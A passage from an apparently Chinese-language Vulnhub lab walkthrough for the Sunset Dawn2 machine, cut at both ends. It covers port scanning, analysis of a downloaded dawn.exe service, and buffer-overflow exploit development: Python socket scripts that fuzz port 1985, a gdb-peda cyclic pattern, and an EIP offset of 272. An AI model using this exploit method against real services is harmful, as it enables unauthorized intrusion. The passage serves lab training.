ny DOM based XSS.\n1435/tcp open  ibm-cics\n1985/tcp open  hsrp\nMAC Address: 08:00:27:09:74:31 (Oracle VirtualBox virtual NIC)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现没扫出什么有用的信息，尝试一下\u003ccode\u003eUDP\u003c/code\u003e扫描\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描\u003ccode\u003eUDP\u003c/code\u003e端口，但是没扫出来\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e寻找突破口\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e没什么思路，先到\u003ccode\u003e80\u003c/code\u003e端口看看\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnhubsunset%20dawn2/image110.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e提示网站正在建设中，请稍后再试，下边是详细信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e网站目前正在建设中，请稍后再试。\n\n如果您在使用公司提供的设备时遇到任何不便，请尽快联系 IT 支持，但是，如果您与“不存在的公司和合伙人”（NECA）没有任何关联，请立即离开此网站。\n新闻：\n\n由于该组织遭受了最后一次入侵，但尚未对此类破坏企图作出解释；NECA 已经找到解决方案，即关闭所有服务并将它们合并在一起，从而创建“Dawn”服务器。可以从此处下载。客户端目前正在开发中。\n摄像头源已成功安装。\n个人资料已更新。\n\n我们需要实施的事情：\n\nIDS 和 WAF 软件。\n一个全新的蓝队，能够检测和驱逐恶意行为者。\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e看得到页面上存在一个超链接，点击后下载了\u003ccode\u003edawn.zip\u003c/code\u003e的压缩包，解压得到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnhubsunset%20dawn2/image111.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e首先看\u003ccode\u003eREADME\u003c/code\u003e里边的内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eDAWN Multi Server - Version \u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\n\nImportant:\n\nDue the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. In order to make sure the connection is finished and the message well received, send a \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e-byte at the ending of your message. \nAlso, the service may crash after several requests.\n\nSorry \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the inconvenience!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eDAWN 多服务器 - 版本 \u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\n\n重要提示：\n\n由于 Dawn 客户端的实现不足，可能会遇到许多问题，例如无法传递消息。为了确保连接完成并且消息被正确接收，请在消息末尾发送一个 \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e 字节。\n此外，服务可能会在多次请求后崩溃。\n\n很抱歉给您带来不便！\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e一看内容解释就感觉是缓冲区溢出漏洞（雾）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们使用虚拟机(测试虚拟机ip为\u003ccode\u003e192.168.111.154\u003c/code\u003e ，同时kali的ip为\u003ccode\u003e192.168.111.159\u003c/code\u003e)打开该应用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnhubsunset%20dawn2/image112.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看当前端口\u003c/p\u003e\n\u003cp\u003e可以发现增加了一个和靶机一模一样的端口，由此判断靶机上也是该服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnhubsunset%20dawn2/image113.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e测试是否存在缓冲区溢出漏洞\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e在windows虚拟机里边测试，打开\u003ccode\u003eimmunity debuger\u003c/code\u003e 然后运行\u003ccode\u003edawn.exe\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e编写测试文件，记得README里边说过要在最后加上\u003ccode\u003enull\u003c/code\u003e字节\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecat buffer.py  \nimport socket\n\na = \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.111.154'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e1985\u003c/span\u003e))\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e假如存在缓冲区溢出漏洞那么应该\u003ccode\u003eESP\u003c/code\u003e会被\u003ccode\u003eA\u003c/code\u003e字节覆盖\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e运行文件，然后查看\u003ccode\u003eimmunity debuger\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnhubsunset%20dawn2/image114.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到\u003ccode\u003eESP\u003c/code\u003e 和\u003ccode\u003eEIP\u003c/code\u003e已经被覆盖掉了，所以存在缓冲区溢出漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e定位EIP\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e存在缓冲区溢出漏洞，那我们就要定为\u003ccode\u003eEIP\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003egdb\u003c/code\u003e生成\u003ccode\u003e500\u003c/code\u003e个唯一字符\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003egdb-peda$ pattern create \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e修改测试文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecat buffer.py \nimport socket\n\na = \u003cspan class=\"hljs-string\"\u003e'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.111.154'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e1985\u003c/span\u003e))\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e和上边一样测试\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnhubsunset%20dawn2/image115.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到为唯一字符\u003ccode\u003e25414925\u003c/code\u003e 是\u003ccode\u003eASCII\u003c/code\u003e码，但是因为是小端显示，所以要将字符反转\u003ccode\u003e25494125\u003c/code\u003e，得\u003ccode\u003e%IA%\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后\u003ccode\u003egds\u003c/code\u003e定位字符，那么就是说到\u003ccode\u003eEIP\u003c/code\u003e之前要填充\u003ccode\u003e272\u003c/code\u003e个字符，然后再增加四个字符就能覆盖\u003ccode\u003eEIP\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003egdb-peda$ pattern offset %IA%\n%IA% found at offset: \u003cspan class=\"hljs-number\"\u003e272\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试是否能正确覆盖\u003ccode\u003eEIP\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecat buffer.py\nimport socket\n\na = \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e272\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\
